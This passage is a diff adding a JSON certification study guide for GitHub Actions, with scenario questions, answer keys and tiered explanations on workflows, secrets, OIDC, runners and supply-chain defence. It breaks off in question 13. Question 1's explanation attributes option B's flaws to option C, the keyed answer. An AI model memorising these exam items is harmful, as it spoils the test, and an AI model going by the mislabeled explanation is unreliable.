@@ -1,0 +1,2472 @@
+{
+  "version": "1.0",
+  "metadata": {
+    "examCode": "GH-200",
+    "examTitle": "GitHub Actions Certification",
+    "provider": "GitHub",
+    "description": "Scenario-Based Study Guide for GitHub Actions Certification - validates ability to automate workflows, build CI/CD pipelines, manage secrets, create reusable actions, and optimize GitHub Actions for enterprise use.",
+    "totalQuestions": 50,
+    "createdDate": "2026-05-05",
+    "lastModified": "2026-05-05T00:00:00Z",
+    "categories": {
+      "cat-workflows": "Workflow Authoring",
+      "cat-cicd": "CI/CD Pipelines",
+      "cat-actions": "Custom Actions",
+      "cat-security": "Security and Secrets",
+      "cat-admin": "Administration and Optimization"
+    }
+  },
+  "questions": [
+    {
+      "id": 1,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Workflow Trigger Events",
+      "scenario": "A development team wants their CI pipeline to run on every push to any branch, every pull request targeting the main branch, and also allow manual triggering for emergency hotfix builds. They also need a nightly build that runs at 2 AM UTC to catch integration issues early.",
+      "questionText": "Which workflow trigger configuration satisfies all four requirements?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "on: [push, pull_request, workflow_dispatch, schedule]"
+        },
+        {
+          "letter": "B",
+          "text": "on: push (branches: ['main']), pull_request, workflow_dispatch"
+        },
+        {
+          "letter": "C",
+          "text": "on: push (branches: ['**']), pull_request (branches: ['main']), workflow_dispatch, schedule (cron: '0 2 * * *')"
+        },
+        {
+          "letter": "D",
+          "text": "on: push, pull_request (branches: ['**']), schedule (cron: '* 2 * * *')"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Each trigger type can have filters — push on all branches, pull_request targeting main only, plus workflow_dispatch and schedule."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The correct configuration uses: push with branches: ['**'] (matches all branches including nested ones like feature/foo), pull_request with branches: ['main'] (triggers only for PRs targeting main), workflow_dispatch (enables the \"Run workflow\" button in the UI for manual triggering), and schedule with cron: '0 2 * * *' (runs at 2:00 AM UTC daily). Option A lacks branch filters. Option C misses the schedule and restricts push to main only. Option D has incorrect cron syntax ('* 2 * * *' runs every minute during the 2 AM hour)."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>push branches filter: '**' matches all branches; '*' matches single-level only (not feature/foo).</li>\n              <li>pull_request branches filter: filters on the BASE branch (target), not the head branch (source).</li>\n              <li>workflow_dispatch: supports custom input parameters (type: choice, string, boolean) for parameterized manual runs.</li>\n              <li>Schedule cron: minimum interval is 5 minutes; scheduled workflows run on the default branch only.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Triggers",
+        "Workflow",
+        "Events"
+      ]
+    },
+    {
+      "id": 2,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Matrix Strategy for Cross-Platform Testing",
+      "scenario": "A library maintainer needs to test their code on Node.js 18, 20, and 22 across Ubuntu, Windows, and macOS. However, they want to exclude the combination of Node.js 18 on Windows (known incompatibility) and add an experimental test on Node.js 23 on Ubuntu that should not fail the entire build if it fails.",
+      "questionText": "Which matrix strategy configuration handles includes, excludes, and experimental combinations?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "strategy: matrix with os: [ubuntu, windows, macos], node: [18, 20, 22, 23] and if conditions on each step"
+        },
+        {
+          "letter": "B",
+          "text": "Run three separate jobs — one per OS — each testing all Node versions sequentially"
+        },
+        {
+          "letter": "C",
+          "text": "Use a single job with a shell script that loops through all combinations"
+        },
+        {
+          "letter": "D",
+          "text": "strategy: matrix with os: [ubuntu, windows, macos], node: [18, 20, 22], exclude node 18 + windows, include node 23 + ubuntu with continue-on-error: true"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Matrix strategy supports exclude (remove specific combinations) and include (add combinations with extra properties like continue-on-error)."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The matrix strategy generates all combinations (3 OS x 3 Node = 9 jobs). The exclude property removes specific combinations (node: 18, os: windows = 8 jobs remaining). The include property adds new combinations with additional variables (node: 23, os: ubuntu, experimental: true). Setting continue-on-error: true on the job with a condition (if: matrix.experimental) ensures the Node.js 23 experiment doesn't fail the overall workflow. This is the idiomatic way to handle cross-platform matrix testing with exceptions."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Matrix generates: os x node = all combinations. Exclude removes specific tuples. Include adds tuples (can include new variables).</li>\n              <li>continue-on-error at job level: job is marked as successful even if steps fail — prevents experimental runs from failing CI.</li>\n              <li>Matrix max: 256 jobs per matrix by default; organization settings can increase this limit.</li>\n              <li>fail-fast: true (default) cancels all in-progress matrix jobs when one fails. Set to false for \"run all regardless\" behavior.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Matrix",
+        "Testing",
+        "Cross-Platform"
+      ]
+    },
+    {
+      "id": 3,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Composite Action Design",
+      "scenario": "A team has 20 repositories that all share the same build steps: install dependencies, run linting, run tests, and upload coverage. Currently, each repo duplicates these ~30 lines of YAML. When the team changes the test framework, they must update 20 repositories. They want a single source of truth for these shared steps that repositories can reference with a single line.",
+      "questionText": "Which approach creates a reusable, versionable set of shared steps?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Copy-paste the YAML steps across all 20 repositories and synchronize manually"
+        },
+        {
+          "letter": "B",
+          "text": "Use a GitHub App that modifies workflows in all repositories simultaneously"
+        },
+        {
+          "letter": "C",
+          "text": "Create a reusable workflow that each repository calls with workflow_call"
+        },
+        {
+          "letter": "D",
+          "text": "Create a composite action in a shared repository with all four steps defined in action.yml, with inputs for customization (node version, test command), versioned via tags — repositories call it with uses: org/shared-build@v1"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Composite actions bundle multiple steps into a single action that can be called with uses: — like a function for workflow steps."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "A composite action (action.yml with runs: using: \"composite\") bundles multiple steps (install, lint, test, coverage upload) into a single action. Inputs provide customization (node-version, test-command) so repositories can pass their specific configuration. Versioned via Git tags (v1, v1.2.0) — consumers use uses: org/shared-build@v1 (major version tag for automatic minor/patch updates). When the test framework changes, update the composite action and cut a new version — all repos get the update on their next run (or pin to a specific version for stability). This is the standard pattern for sharing step-level logic across repositories."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Composite actions can use shell steps (run:), call other actions (uses:), and define outputs accessible to the calling workflow.</li>\n              <li>Versioning: v1 tag moved on each minor release (floating major tag) vs. v1.2.3 for exact pinning — consumer chooses stability vs. freshness.</li>\n              <li>Composite vs. reusable workflow: composite embeds steps within the calling job; reusable workflow runs as a separate job with its own runner.</li>\n              <li>Composite actions support: inputs, outputs, environment variables, and conditional steps (if: expressions within steps).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Composite Actions",
+        "Reusability",
+        "DRY"
+      ]
+    },
+    {
+      "id": 4,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Secrets Management",
+      "scenario": "An organization deploys to three environments (development, staging, production) with different credentials for each. They need: environment-specific secrets (different database passwords per environment), required reviewers before production deployments use production secrets, and the ability for dependabot PRs to run tests without accessing any secrets (since PRs from forks cannot access secrets).",
+      "questionText": "Which secrets management approach provides environment isolation with approval gates?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Store all secrets as repository secrets with prefixed names (PROD_DB_PASSWORD, STAGING_DB_PASSWORD)"
+        },
+        {
+          "letter": "B",
+          "text": "Use a single set of secrets and parameterize the environment at runtime"
+        },
+        {
+          "letter": "C",
+          "text": "Store secrets in a .env file committed to the repository with branch protection"
+        },
+        {
+          "letter": "D",
+          "text": "GitHub Environments with environment-specific secrets, protection rules requiring reviewer approval for production, and workflow conditions that skip secret-dependent steps for dependabot/fork PRs"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "GitHub Environments provide: environment-scoped secrets, protection rules (required reviewers, wait timers), and deployment gates — purpose-built for this pattern."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "GitHub Environments define deployment targets (development, staging, production) with: environment-specific secrets (each environment has its own DB_PASSWORD — no prefix naming needed), protection rules (production requires approval from designated reviewers before the job runs), and wait timers (optional delay before deployment proceeds). For dependabot PRs: secrets are not available to workflows triggered by pull_request from forks, so adding an if: github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository condition skips secret-dependent steps for fork PRs while still running basic tests."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Environment secrets override repository secrets with the same name — enabling environment-specific values without renaming.</li>\n              <li>Protection rules: required reviewers (up to 6), wait timer (0-43200 minutes), branch restrictions (only main can deploy to production).</li>\n              <li>GITHUB_TOKEN permissions: environments can restrict GITHUB_TOKEN permissions further than the repository default.</li>\n              <li>Deployment status: environments show deployment history in the repository — which commit is deployed where, with rollback visibility.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Secrets",
+        "Environments",
+        "Security"
+      ]
+    },
+    {
+      "id": 5,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Self-Hosted Runner Management",
+      "scenario": "An enterprise runs builds that require access to internal resources (private npm registry, internal databases for integration tests). GitHub-hosted runners cannot reach these resources. They need: auto-scaling runners that start on demand and terminate after jobs complete (to avoid paying for idle compute), runner groups restricting which repositories can use specific runners, and automatic updates to the runner software without manual intervention.",
+      "questionText": "Which self-hosted runner architecture provides auto-scaling, access control, and low maintenance?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Manually provisioned VMs running the runner application permanently"
+        },
+        {
+          "letter": "B",
+          "text": "A single shared self-hosted runner with all jobs queued sequentially"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub-hosted larger runners with VPN connectivity to internal resources"
+        },
+        {
+          "letter": "D",
+          "text": "Actions Runner Controller (ARC) on Kubernetes with autoscaling (scale from zero to max based on queued jobs), runner groups at the organization level restricting access to specific repository sets, and automatic runner version updates via ARC's managed lifecycle"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Actions Runner Controller (ARC) on Kubernetes provides autoscaling from zero, ephemeral runners (clean environment per job), and managed lifecycle."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Actions Runner Controller (ARC) deploys on Kubernetes and manages runner pods: scales from zero pods (no idle cost) to maximum based on queued workflow jobs (webhook-driven autoscaling). Each job gets a fresh pod (ephemeral runner — clean state, no cross-job contamination). Runner groups at the organization level define which repositories can target specific runner labels — restricting access to internal resources. ARC handles runner software updates automatically as part of pod lifecycle (new pods always use the latest runner image). Kubernetes on internal network provides access to private npm registries and databases without VPN configuration."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>ARC v2 (autoscaling runner scale sets): webhook-driven scaling with 0-N runners per ScaleSet — fastest response to job demand.</li>\n              <li>Ephemeral runners: --ephemeral flag means runner accepts one job then unregisters — no state leakage between jobs.</li>\n              <li>Runner groups: organization admin assigns repos to groups; runners registered to a group only pick up jobs from those repos.</li>\n              <li>Custom runner images: Docker images with pre-installed tools (Maven, .NET SDK, etc.) reduce job startup time vs. installing per job.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Self-Hosted Runners",
+        "ARC",
+        "Autoscaling"
+      ]
+    },
+    {
+      "id": 6,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Job Dependencies and Outputs",
+      "scenario": "A deployment pipeline has three jobs: build (compiles code and produces an artifact), test (runs against the build artifact), and deploy (deploys to production). Deploy must only run if both build and test succeed. Additionally, the build job determines the version number which deploy needs to tag the release. The test job needs the artifact produced by build.",
+      "questionText": "Which workflow structure implements these dependencies with artifact and output passing?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Three independent jobs with no dependencies, relying on execution order"
+        },
+        {
+          "letter": "B",
+          "text": "jobs: build (upload artifact, set output version), test (needs: [build], download artifact), deploy (needs: [build, test], use build output for version) — with artifact passing via actions/upload-artifact and actions/download-artifact"
+        },
+        {
+          "letter": "C",
+          "text": "A single job with all steps sequential (build, test, deploy) to avoid artifact passing"
+        },
+        {
+          "letter": "D",
+          "text": "Use workflow_run to trigger test after build completes, then deploy after test"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "needs: defines job dependencies; artifacts pass files between jobs; job outputs pass scalar values between jobs."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The needs: keyword defines explicit dependencies: test needs: [build] ensures test waits for build to complete. deploy needs: [build, test] ensures both must succeed before deployment. The build job uses actions/upload-artifact to persist the compiled artifact, and test uses actions/download-artifact to retrieve it (artifacts persist for the workflow run duration). For the version number, build sets a job output (echo \"version=1.2.3\" &gt;&gt; $GITHUB_OUTPUT) which deploy accesses via needs.build.outputs.version. This is the standard pattern for multi-job pipelines with data dependencies."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Job outputs: defined in outputs: section of the job, set via $GITHUB_OUTPUT file in a step, accessed via needs.job_id.outputs.name.</li>\n              <li>Artifacts: binary files shared between jobs; default retention 90 days; upload/download add ~10-30 seconds overhead per artifact.</li>\n              <li>needs creates a DAG: if any needed job fails, the dependent job is skipped (unless if: always() is used).</li>\n              <li>Performance: separate jobs run on separate runners (potentially in parallel for independent jobs) vs. single job on one runner.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Job Dependencies",
+        "Artifacts",
+        "Outputs"
+      ]
+    },
+    {
+      "id": 7,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Container-Based CI Pipeline",
+      "scenario": "A team builds a microservice that runs in Docker. Their CI pipeline needs to: build the Docker image, run tests inside the container (to match production environment exactly), scan the image for vulnerabilities, push to GitHub Container Registry (ghcr.io) with proper tags (commit SHA and semantic version), and sign the image for supply chain verification.",
+      "questionText": "Which CI pipeline implements all container lifecycle steps with proper tagging and signing?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Build locally and push pre-built images from developer machines"
+        },
+        {
+          "letter": "B",
+          "text": "Build without scanning and push to Docker Hub with latest tag only"
+        },
+        {
+          "letter": "C",
+          "text": "Docker build with cache, test via docker run, Trivy/Grype scan, docker/build-push-action for multi-tag push to ghcr.io (SHA + semver tags), and sigstore/cosign-installer for keyless image signing"
+        },
+        {
+          "letter": "D",
+          "text": "Use GitHub Packages Maven registry for container storage"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "The full container CI lifecycle: build with cache, test in container, scan for CVEs, multi-tag push to registry, and sign for supply chain security."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The pipeline uses: docker/build-push-action with GitHub Actions cache (cache-from: type=gha) for fast builds. Tests run via docker run on the built image ensuring production environment parity. Trivy or Grype scans the image for known CVEs (blocking on critical/high vulnerabilities). docker/metadata-action generates tags (ghcr.io/org/app:sha-abc1234, ghcr.io/org/app:1.2.3) and docker/build-push-action pushes to ghcr.io (authenticated via GITHUB_TOKEN). Finally, cosign signs the image using keyless signing (Sigstore OIDC — no private key management needed) — consumers can verify the image was built by this CI pipeline."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>docker/build-push-action: supports multi-platform builds (linux/amd64, linux/arm64), BuildKit cache, and attestations.</li>\n              <li>ghcr.io authentication: GITHUB_TOKEN has packages:write permission — no additional credentials needed for the same organization.</li>\n              <li>Cosign keyless signing: uses GitHub OIDC token to get a short-lived Sigstore certificate — no long-lived keys to manage.</li>\n              <li>Image tags: avoid 'latest' in CI — use immutable tags (SHA, semver) for reproducible deployments.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Docker",
+        "Container Registry",
+        "Supply Chain"
+      ]
+    },
+    {
+      "id": 8,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "OIDC for Cloud Deployments",
+      "scenario": "A team deploys to AWS from GitHub Actions. Currently, they store long-lived AWS access keys as repository secrets. Security audit flagged this as a risk: if keys are leaked, an attacker has permanent access until keys are manually rotated. They want to eliminate long-lived credentials entirely while maintaining the ability to deploy to AWS from workflows.",
+      "questionText": "Which approach eliminates long-lived credentials for AWS deployments from GitHub Actions?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Rotate AWS access keys every 24 hours via a scheduled workflow"
+        },
+        {
+          "letter": "B",
+          "text": "Store keys in an external vault and fetch them at the start of each workflow"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub OIDC (OpenID Connect) with AWS IAM Identity Provider — workflows request short-lived credentials from AWS STS by presenting a GitHub-issued JWT token, which AWS validates against the configured trust policy"
+        },
+        {
+          "letter": "D",
+          "text": "Use GitHub-hosted runners with IAM instance profiles"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "OIDC federation: GitHub issues a JWT token to the workflow, AWS validates it and issues temporary credentials — no stored secrets needed."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "GitHub OIDC: configure AWS IAM Identity Provider trusting token.actions.githubusercontent.com. Create an IAM role with a trust policy specifying allowed repositories/branches (sub claim: repo:org/repo:ref:refs/heads/main). In the workflow: permissions: id-token: write enables OIDC. The aws-actions/configure-aws-credentials action requests a JWT from GitHub, presents it to AWS STS AssumeRoleWithWebIdentity, and receives temporary credentials (default 1 hour). No secrets stored anywhere — credentials are ephemeral, scoped to the specific workflow run, and automatically expire."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Trust policy sub claim: \"repo:org/repo:ref:refs/heads/main\" restricts which repos/branches can assume the role.</li>\n              <li>OIDC token claims: repository, repository_owner, ref, sha, workflow, actor — all available for fine-grained trust policies.</li>\n              <li>permissions: id-token: write is required in the workflow — without it, the ACTIONS_ID_TOKEN_REQUEST_TOKEN is not available.</li>\n              <li>Supported clouds: AWS, Azure, GCP all support GitHub OIDC federation — same pattern, different trust configuration.</li></ul>"
+        }
+      ],
+      "tags": [
+        "OIDC",
+        "AWS",
+        "Credentials"
+      ]
+    },
+    {
+      "id": 9,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Workflow Optimization and Caching",
+      "scenario": "A Node.js project's CI workflow takes 8 minutes. Analysis shows: 3 minutes installing node_modules (same dependencies for most runs), 2 minutes building TypeScript (only source files changed, not all files), 2 minutes running tests, and 1 minute for setup/checkout. The team wants to reduce this to under 3 minutes for typical runs where only source code changes.",
+      "questionText": "Which optimization techniques reduce CI time to under 3 minutes for typical source-only changes?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Cache node_modules with actions/cache keyed on package-lock.json hash, use TypeScript incremental compilation with .tsbuildinfo cached, and run tests in parallel (jest --shard) across matrix jobs"
+        },
+        {
+          "letter": "B",
+          "text": "Use a faster runner with more CPU cores for all steps"
+        },
+        {
+          "letter": "C",
+          "text": "Skip CI on commits that only change source files"
+        },
+        {
+          "letter": "D",
+          "text": "Move to a monorepo to reduce checkout time"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Cache dependencies (eliminates 3 min install), cache build artifacts (reduces 2 min build), and parallelize tests — together bringing typical runs under 3 minutes."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "actions/cache with key: hashFiles('package-lock.json') restores node_modules from cache when dependencies haven't changed — eliminating the 3-minute install. TypeScript incremental compilation (tsc --incremental) with .tsbuildinfo file cached only recompiles changed files — reducing 2-minute build to seconds. Test parallelization using jest --shard=1/3 across 3 matrix jobs runs tests in ~40 seconds instead of 2 minutes. Combined: setup (30s) + cached install (5s) + incremental build (10s) + parallel tests (40s) = under 2 minutes for typical source-only changes. Cache hits dramatically reduce CI time for the common case."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>actions/cache key strategy: primary key (exact match) + restore-keys (prefix match for partial cache hits).</li>\n              <li>Cache scope: caches are scoped to branch by default; PRs can restore caches from the base branch.</li>\n              <li>Cache size limit: 10GB per repository across all caches; LRU eviction for caches not accessed in 7 days.</li>\n              <li>actions/setup-node has built-in caching (cache: 'npm') that handles node_modules caching automatically — simpler than manual actions/cache.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Caching",
+        "Performance",
+        "Optimization"
+      ]
+    },
+    {
+      "id": 10,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Reusable Workflows",
+      "scenario": "An organization has 50 repositories that all need the same deployment workflow: build, run security scan, deploy to staging, run smoke tests, then deploy to production with approval. Each repository may have slightly different build commands and deployment targets. The platform team wants to maintain the deployment logic centrally while allowing repository teams to customize specific parameters.",
+      "questionText": "Which pattern provides centrally-maintained deployment logic with per-repository customization?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "A GitHub App that pushes workflow files to all 50 repositories automatically"
+        },
+        {
+          "letter": "B",
+          "text": "A single workflow in a monorepo that detects which service changed and deploys accordingly"
+        },
+        {
+          "letter": "C",
+          "text": "A reusable workflow (workflow_call trigger) in a central .github repository with inputs for build command, deployment target, and environment name — repositories call it with uses: org/.github/.github/workflows/deploy.yml@main passing their specific values"
+        },
+        {
+          "letter": "D",
+          "text": "Template repositories that teams fork — manual synchronization of updates"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Reusable workflows (workflow_call) define jobs that other workflows invoke — like function calls between workflows, with inputs for customization."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "A reusable workflow in the organization's .github repository (or any repository) uses the workflow_call trigger with defined inputs (build_command, deploy_target, environment) and secrets (inherited or explicitly passed). Calling workflows in each of the 50 repositories simply reference: uses: org/.github/.github/workflows/deploy.yml@main with: build_command: 'npm run build', deploy_target: 'app-name'. The platform team maintains the deployment logic centrally — updates propagate to all callers immediately (if pinned to @main) or on version bump (if pinned to @v1). Repository teams only maintain a thin calling workflow with their specific parameters."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Reusable workflows can define: inputs (string, number, boolean), secrets (required/optional), and outputs (passed back to caller).</li>\n              <li>secrets: inherit passes ALL caller secrets to the reusable workflow without listing them individually.</li>\n              <li>Nesting limit: reusable workflows can call other reusable workflows up to 4 levels deep.</li>\n              <li>.github repository: special organization repository; workflows here are accessible to all org repos without explicit visibility settings.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Reusable Workflows",
+        "Organization",
+        "Standardization"
+      ]
+    },
+    {
+      "id": 11,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Deployment Strategies",
+      "scenario": "A web application serves 1 million users. The team wants zero-downtime deployments with the ability to: deploy to 5% of users first (canary), monitor error rates for 10 minutes, automatically roll back if error rate exceeds 1%, and promote to 100% if metrics are healthy. The application runs on Kubernetes and uses GitHub Actions for CI/CD.",
+      "questionText": "Which GitHub Actions deployment workflow implements canary deployment with automated rollback?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Deploy to all users simultaneously and roll back manually if issues are reported"
+        },
+        {
+          "letter": "B",
+          "text": "Workflow with: deploy canary (5% traffic via Kubernetes Ingress annotations), wait step (sleep 10 minutes), health check step (query metrics API for error rate), conditional rollback step (if error_rate > 1%, revert canary), or promote step (scale canary to 100%)"
+        },
+        {
+          "letter": "C",
+          "text": "Blue-green deployment with DNS switch and 1-hour validation period"
+        },
+        {
+          "letter": "D",
+          "text": "Feature flags toggled via API call in the workflow without new deployment"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Canary deployment in CI/CD: deploy small, wait, check metrics, decide (promote or rollback) — all steps automated in the workflow."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The workflow implements progressive delivery: Step 1 deploys the canary (new version to a subset of pods, Kubernetes Ingress configured for 5% traffic weight). Step 2 waits 10 minutes for metrics to accumulate. Step 3 queries the monitoring API (Prometheus, Datadog, or CloudWatch) for the canary's error rate. Step 4 is conditional: if error_rate &gt; 1%, execute kubectl rollback to remove the canary; if healthy, scale the canary deployment to 100% (replacing the old version). GitHub Environments with deployment_status track which version is live. This fully automates the progressive delivery loop within GitHub Actions."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Kubernetes canary: Ingress annotations (nginx.ingress.kubernetes.io/canary-weight: \"5\") route traffic percentage.</li>\n              <li>Alternative: Argo Rollouts or Flagger on Kubernetes provide built-in canary analysis — triggered by GitHub Actions deploying a new Rollout spec.</li>\n              <li>Metrics check: curl the monitoring API endpoint in a run: step, parse JSON with jq, set step output for conditional logic.</li>\n              <li>GitHub deployment status API: create deployment, set status (pending → in_progress → success/failure) for UI visibility.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Canary Deployment",
+        "Progressive Delivery",
+        "Kubernetes"
+      ]
+    },
+    {
+      "id": 12,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "JavaScript Action Development",
+      "scenario": "A team needs a custom action that: calls an external API to validate deployment readiness (checks database migrations are pending, feature flags are configured, and dependencies are healthy), outputs a structured result (ready: true/false, blockers: list), and fails the workflow with a clear error message if not ready. The action must be fast (no Docker build) and work on all runner OS types.",
+      "questionText": "Which action type and implementation approach meets these requirements?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Docker container action with a shell script making curl calls"
+        },
+        {
+          "letter": "B",
+          "text": "A separate repository with a CLI tool that workflows install and execute"
+        },
+        {
+          "letter": "C",
+          "text": "Composite action with multiple run: steps using bash and curl"
+        },
+        {
+          "letter": "D",
+          "text": "JavaScript action using @actions/core for outputs and failure handling, @actions/http-client for API calls, compiled with ncc for zero-dependency distribution — runs natively on any OS without Docker"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "JavaScript actions run natively on all runner OS types without Docker overhead and provide rich integration via the @actions toolkit packages."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "JavaScript actions (runs: using: 'node20' in action.yml) execute directly on the runner without Docker — fast startup, works on Ubuntu/Windows/macOS. @actions/core provides: core.setOutput('ready', 'true') for structured outputs, core.setFailed('Migration pending: users table') for clear failure messages. @actions/http-client makes API calls with built-in retry and timeout. Compiled with @vercel/ncc into a single dist/index.js with all dependencies bundled — no node_modules needed at runtime. This is the fastest, most portable approach for API-calling actions that need structured outputs."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>@actions/core: setOutput, setFailed, info, warning, error, group, saveState, getState — full workflow integration.</li>\n              <li>ncc compilation: bundles all node_modules into a single file — consumers don't need npm install, action starts instantly.</li>\n              <li>JavaScript vs Docker action: JS starts in ~1s, Docker adds 30-60s for image pull/build. JS runs on all OS; Docker requires Linux runners.</li>\n              <li>Testing: mock @actions/core and @actions/http-client in Jest tests — action logic is testable as pure Node.js code.</li></ul>"
+        }
+      ],
+      "tags": [
+        "JavaScript Action",
+        "Custom Actions",
+        "Development"
+      ]
+    },
+    {
+      "id": 13,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Supply Chain Security",
+      "scenario": "A security-conscious organization wants to prevent supply chain attacks via GitHub Actions. Risks include: compromised third-party actions injecting malicious code, actions exfiltrating secrets to external servers, and typosquatting attacks (using a misspelled action name that contains malware). They need a defense-in-depth approach without blocking all external actions.",
+      "questionText": "Which combination of controls mitigates supply chain risks from third-party actions?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Pin actions to full commit SHA (not tags), use organization-level allowed actions list, restrict GITHUB_TOKEN permissions with permissions: key, and use network egress rules on self-hosted runners to prevent secret exfiltration"
+        },
+        {
+          "letter": "B",
+          "text": "Only use actions from the GitHub Marketplace which are all verified"
+        },
+        {
+          "letter": "C",
+          "text": "Fork all third-party actions into the organization and use internal copies only"
+        },
+        {
+          "letter": "D",
+          "text": "Disable all third-party actions and only use run: steps with inline scripts"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Defense-in-depth: pin to SHA (prevent tag hijacking), allow-list (prevent typosquatting), minimal permissions (limit blast radius), and network controls (prevent exfiltration)."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Pinning to full SHA (uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29) prevents tag-based attacks where a compromised action moves a tag to malicious code. Organization-level allowed actions list restricts which actions (by owner or specific action) can be used — preventing typosquatting. Minimal GITHUB_TOKEN permissions (permissions: contents: read only) limits what a compromised action can do. Network egress rules on self-hosted runners (firewall/proxy) prevent actions from sending secrets to external servers. Together, these provide defense-in-depth without completely blocking third-party actions."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
